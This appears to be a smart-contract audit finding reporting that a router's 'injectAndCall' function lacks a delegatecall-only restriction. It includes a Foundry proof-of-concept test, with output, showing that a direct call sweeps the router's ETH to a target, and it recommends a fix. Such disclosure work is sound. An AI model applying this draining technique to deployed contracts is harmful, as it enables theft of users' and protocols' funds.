  "body": "## Finding description and impact\n\nThe `injectAndCall` function is intended to inject a user wallet’s balance into a target contract call only in a delegatecall context, as documented in the `ITrailsRouter::injectAndCall`. its comments (`/// @notice Injects balance and calls target (for delegatecall context)`). This design ensures that the function operates on the caller’s wallet balances, not the router contract’s storage.\n\n**Root Cause:**  \nThe root cause of the issue is that `injectAndCall` lacks a restriction to delegatecall-only execution `onlyDelegatecall`. As a result, anyone can call this function directly on the router contract. When called this way:\n\n- The contract itself becomes the caller, so `_getSelfBalance(token)` reads the router’s balance instead of the intended user wallet’s balance.\n- Arbitrary target calls may be executed with injected balances from the router instead of the wallet.\n- This violates the intended security model, as the router’s funds can be misused.\n\n**Impact:**  \n\n- **Direct balance manipulation:** Attackers can invoke `injectAndCall` directly and potentially drain ETH or ERC20 tokens from the router.  \n- **Loss of intended wallet isolation:** User wallet balances remain untouched, breaking the expected behavior.  \n\n## Recommended mitigation steps\n\n- Add `onlyDelegatecall` modifier to restrict `injectAndCall` to delegatecall only:\n\n```solidity\n\nfunction injectAndCall(\n    address token,\n    address target,\n    bytes calldata callData,\n    uint256 amountOffset,\n    bytes32 placeholder\n) external payable onlyDelegatecall;\n```",
  "proof_of_concept": "Add the following test case to `TrailsRouterTest` contact in `TrailsRouter.t.sol`\n\n```solidity\n\n    function test_inject_and_call_direct_call_does_not_sweep_wallet() public {\n    // Deploy a mock user wallet\n    MockWallet wallet = new MockWallet();\n\n    // Amount of ETH in the wallet and router\n    uint256 ethAmount = 1 ether;\n\n    // Prepare calldata for the target function\n    // The PLACEHOLDER will be replaced with the balance (if injectAndCall acted correctly)\n    bytes memory callData = abi.encodeWithSignature(\n        \"depositEth(uint256,address)\", \n        PLACEHOLDER, \n        address(0x123)\n    );\n\n    // Fund both the mock wallet and the router contract\n    vm.deal(address(wallet), ethAmount);\n    vm.deal(address(router), ethAmount);\n\n    // Call injectAndCall directly on the router\n    // Since injectAndCall lacks onlyDelegatecall protection, it acts on router balance instead of wallet\n    router.injectAndCall(address(0), address(targetEth), callData, 4, PLACEHOLDER);\n\n    // Assertions:\n\n    // 1. Target contract should receive ETH from the router, not the wallet\n    assertEq(targetEth.lastAmount(), ethAmount, \"Target should receive router's ETH balance\");\n\n    // 2. Wallet balance remains intact because injectAndCall did not execute via delegatecall\n    assertEq(address(wallet).balance, ethAmount, \"Wallet should remain intact\");\n\n    // 3. Router balance is now empty since injectAndCall used router's balance\n    assertEq(address(router).balance, 0, \"Router balance should be swept empty\");\n}\n\n```\n\nRun the command below to run the test `forge test --mt test_inject_and_call_direct_call_does_not_sweep_wallet -vvv`\n\nOutput\n\n```solidity\n[⠊] Compiling...\n[⠃] Compiling 1 files with Solc 0.8.30\n[⠊] Solc 0.8.30 finished in 4.82s\nCompiler run successful!\n\nRan 1 test for test/TrailsRouter.t.sol:TrailsRouterTest\n[PASS] test_inject_and_call_direct_call_does_not_sweep_wallet() (gas: 322264)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.12ms (84.15µs CPU time)\n\nRan 1 test suite in 5.66ms (1.12ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n\n```\n\nThe test demonstrates that calling `injectAndCall` directly on the router causes the router’s own balance to be used instead of the wallet’s balance. Because the function is not restricted to `onlyDelegateCall`, the router becomes the caller, and `_getSelfBalance` reads the router’s ETH. As a result, the wallet remains untouched, and the router’s funds are swept, confirming the unintended behavior.",
